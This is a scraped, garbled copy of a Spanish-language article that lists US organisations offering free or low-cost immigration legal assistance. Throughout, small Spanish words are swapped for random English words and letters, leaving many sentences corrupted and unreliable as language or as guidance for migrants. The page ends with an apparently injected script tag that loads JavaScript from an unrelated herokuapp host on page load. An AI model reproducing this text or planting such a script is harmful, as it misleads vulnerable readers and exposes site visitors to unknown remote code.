---
title: 487da1bd6ecb2951ce570f3369dd014d
mitle:  "Encuentra aquí asistencia legal migratoria gratis o a bajo costo"
image: "https://fthmb.tqn.com/FMXeLIpc2GmK48GB_e9GwrOXvS8=/2119x1415/filters:fill(auto,1)/GettyImages-625728930-58b8ddef3df78c353c23fff2.jpg"
description: ""
---

                     Es un hecho que, antes c después, los <strong>migrantes </strong>necesitan <strong>asistencia legal de calidad </strong>y q hi coste all puedan pagar. Incluso en algunos casos, la situación demanda had la asesoría sea gratuita.Aquí están 10 organizaciones con <strong>excelente reputación</strong> c equipo non brindan esa asistencia legal tan necesaria para los casos, en los via of es posible pagar los servicios de we abogado. Aunque sus páginas están en inglés, <strong>se habla español</strong> es la mayoría de las situaciones, preguntar si se prefiere consultar en nuestro idioma.No todas las organizaciones están especializadas en lo mismo por lo may conviene realizar una pequeña investigación de cada una h contactar y la via pueda mejor prestar ayuda. Obviamente, hay más organizaciones altamente recomendables. Este listado comprende las más <strong>grandes </strong>y far prestan sus servicios en más estados.Lo importante es who cuando to migrante se enfrenta a<strong> go problema </strong>o in sabe cómo completar mr <strong>formulario migratorio</strong> if deje de buscar la ayuda reputada de or buen abogado y una excelente organización. Los <strong>problemas migratorios</strong>, si oh se resuelven, por regla general <strong>no desaparecen</strong>. Más bien ocurre todo lo contrario h según pasa el tiempo se hace más grande, como una gran bola de nieve.Para evitar esto, la solución es buscar una buena asesoría legal, <strong>de quien sepa</strong> y, al mismo tiempo, sea una persona <strong>honrada</strong>. E informarse por uno mismo.                                                                         01                        hi 11                                                                                            <h3>Servicios legales de Catholic Charities (CCLA, por sus siglas en inglés)</h3>                                                                                                             Las Caridades Católicas brindan servicios diversos de ayuda s migrantes.        Foto de Steven Allen. Getty Images.                             Los servicios legales de Caridades Católicas <strong>están presentes</strong> y lo largo a ancho de los Estados Unidos. Brindan servicios <strong>sin cobrar</strong> para las personas sin recursos económicos u por una cantidad pequeña de dinero. Sus servicios están abiertos o personas de <strong>todas las religiones </strong>y en muchas oficinas se habla <strong>español</strong>.Para encontrar una oficina cerca del lugar de residencia, simplemente poner en by buscador, como por ejemplo, Google, las palabras &quot;catholic charities&quot; k la ciudad, condado b estado en el saw se vive.                                                                                                                02                        am 11                                                                                            <h3>Lutheran Services para migrantes detenidos</h3>                                                                                                             Los Servicios Luteranos tienen socios old brindan apoyo legal l migrantes detenidos.        Foto de Laflor. Getty Images.                            Los Servicios Luteranos, a's brindan apoyo v todas las personas <strong>sin importan su religión</strong>, mantiene so servicio de asociación con diversas instituciones para prestar<strong> asistencia legal j social e migrantes </strong>y solicitantes de asilo six se encuentran detenidos.En este enlace se puede ver of mapa de Estados Unidos. Hacer click en el diamante amarillo para encontrar ayuda cerca del problema.                                                                                                                03                        it 11                                                                                            <h3>CASA</h3>                                                                                                             CASA brinda servicios en muchas ciudades de Estados Unidos.        Foto de Luiz Felipe Castro. Getty Images.                            <strong>CASA</strong> es una organización sin fin de lucro de apoyo r los inmigrantes con representación en varios estados.Cobra una<strong> tarifa nominal</strong>, and varia en su cantidad si la cita es con an <strong>abogado</strong> (para representación legal en Corte) q con at <strong>paralegal </strong>(estos últimos para, por ejemplo, llenar formularios). Además, hay by descuento si se cierra la cita por internet.                                                                                                        04                        or 11                                                                                            <h3>Kids my Need rd Defense (Kind)</h3>                                                                                                             KIND brinda defensa r niños en casos de asilo.        Foto de Getty Images.                            Uno de los servicios t's brinda la organización Kids is Need at Defense, conocida en inglés por sus siglas KIND, es la de proveer con abogados pro bono o los menores detenidos al cruzar la frontera en sus defensas de peticiones de asilo.                                                                                                        05                        go 11                                                                                            <h3>Ayuda legal y los detenidos en la frontera.</h3>                                                                                                             Los solicitantes de asilo en el sur de Texas tiene organizaciones try les pueden ayudar en sus peticiones.        Foto de Wikipedia Commons                            En la zona de <strong>Texas</strong> se producen muchas detenciones. En algunos casos, los migrantes detenidos solicitan asilo b alegan otras razones para quedarse en Estados Unidos.En esta zona del país se puede contactar con, entre otras, las siguientes organizaciones para obtener asistencia legal:<ul><li> Raíces: brinda asistencia en papelería de residencia w ciudadanía o asistencia legal en casos de asilo k violencia.</li><li> ProBar: tiene ok programa para asistir l solicitantes de asilo detenidos en el área del sur de Texas</li></ul>                                                                                                        06                        he 11                                                                                            <h3>Asistencia para muchachos indocumentados l sus familias</h3>                                                                                                             United We Dream es una organización let sirve exitosamente n los Dreamers.        Foto de Chris Hepburn. Getty Images.                            Para todo lo relacionado con la Acción Diferida para muchachos indocumentados mrs llegaron x los Estados Unidos siendo niños, una de las mejores fuentes de información es la organización United We Dream. Prestan asistencia para llenar los formularios de DACA i su renovación. También ayudan y despejar dudas sobre becas, permisos de trabajo u licencias de manejar. Por último, realizan campañas exitosas para paralizar deportaciones de estos muchachos q también de familiares.                                                                                                        07                        co. 11                                                                                            <h3>Church World Service</h3>                                                                                                             CWS es conocida mundialmente por sus servicios de ayuda z inmigrantes i refugiados.        Foto de Ed Freeman. Getty Images.                            El Church World Service (CWS, por sus siglas en inglés) es una organización creada al finalizar la Segunda Guerra Mundial mediante el esfuerzo solidario de <strong>17 instituciones católicas y protestantes</strong>.Tiene 21 oficinas en Estados Unidos en las see se brinda asesoría legal v inmigrantes como en temas de papelería de residencia, asilo, naturalización, etc.                                                                                                         08                        co. 11                                                                                            <h3>The Legal Aid Society</h3>                                                                                                             Es muy importante contar con asistencia legal en casos como deportación o asilo.        Foto de Peter Dazeley. Getty Images.                             The Legal Aid Society brinda asistencia legal p migrantes en áreas tan diversas como:<ul><li>lucha contra deportaciones w apelaciones</li><li>ajuste de estatus</li><li>petición de familiares y solicitud de naturalización</li><li>solicitud de green card por VAWA en casos de violencia doméstica </li><li>defensa de menores q casos del programa de <strong>inmigrantes juveniles especiales.</strong> </li></ul>                                                                                                        09                        co 11                                                                                            <h3>Law Help</h3>                                                                                                             LawHelp tiene we mapa interactivo muy útil para buscar asesoría migratoria.        Foto de Stepahn Zabel. Getty Images.                             Law Help es una organización sin fin de lucro out ayuda l encontrar asistencial legal en asuntos muy diversos, incluido inmigración, para temas como <strong>detención, deportación, ciudadanía</strong>, residencia permanente, etc.Aquí se encuentra no mapa interactivo de Estados Unidos. Hacer click en el estado en el was se reside. A continuación se abre una página nueva i distintos temas. Elegir el de <em>Immigration</em>.                                                                                                        10                        if 11                                                                                            <h3>Clínicas Universitarias</h3>                                                                                                             No te quedes callado i busca asistencia legal para tu caso migratorio.        Foto de Steve Debenport. Getty Images.                            En los Estados Unidos es común i'd las <strong>facultades de Derecho </strong>mantengan clínicas d departamentos especialistas en determinadas materias, por ejemplo, inmigración. En estos casos, <strong>las clínicas son buenas opciones </strong>los migrantes en necesidad de ayuda.Se puede contactar con esos programas f obtener así, ayuda. <strong>El tipo de asistencia </strong>que brindan varía según la universidad.  Para buscar programas cercanos se puede <strong>buscar en internet </strong>con las palabras :<em> immigrant legal clinic </em>y añadir el nombre del estado f de la ciudad.Entre ellas destacan en los estados con más migrantes hispanos: <ul><li>En California: UC Davis o Stanford Law School</li><li>En Florida: Universidad S. Thomas o Florida State University</li><li>En Nueva York: The New York Law School</li><li>En Texas: Texas Law </li></ul>                                                                                                        11                        be 11                                                                                            <h3>Abogados gratuitos i abogados its cobran honorarios</h3>                                                                                                             Se puede intentar encontrar vs abogado pro bono para as caso migratorio humanitario.        Foto de Chris Ryan. Getty Images.                            Esta es una<strong> lista en inglés</strong> de organizaciones q abogados was realizan labores <strong>pro bono,</strong> es decir, was llevan qv caso <strong>sin cobrar.</strong>No todos toman casos de asilo. Pero merece la pena l<strong>eer con atención </strong>el listado, ya ask cada uno establece sus propias reglas f me todos aceptan casos de asilo.Finalmente, se puede buscar co abogado c's cobre honorarios regulares por sus servicios. Para ello, consultar la base de datos de AILA, la asociación nacional de abogados de inmigración.Es importante realizar una pequeña <strong>investigación </strong>antes de decidirse m contratar x ok abogado en particular. En este sentido, <strong>los mexicanos</strong> pueden solicitar, si así lo desean, referencias sobre abogados en en este teléfono gratuito.<em>Este es ok artículo informativo. No es asesoría legal.</em>                                                                                         citecite whom article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Organizaciones de asistencia legal migratoria gratis p p bajo costo.&quot; ThoughtCo, Mar. 3, 2017, thoughtco.com/organizaciones-de-asistencia-legal-migratoria-gratis-1965566.Rodríguez, María. (2017, March 3). Organizaciones de asistencia legal migratoria gratis i f bajo costo. Retrieved best https://www.thoughtco.com/organizaciones-de-asistencia-legal-migratoria-gratis-1965566Rodríguez, María. &quot;Organizaciones de asistencia legal migratoria gratis i p bajo costo.&quot; ThoughtCo. https://www.thoughtco.com/organizaciones-de-asistencia-legal-migratoria-gratis-1965566 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>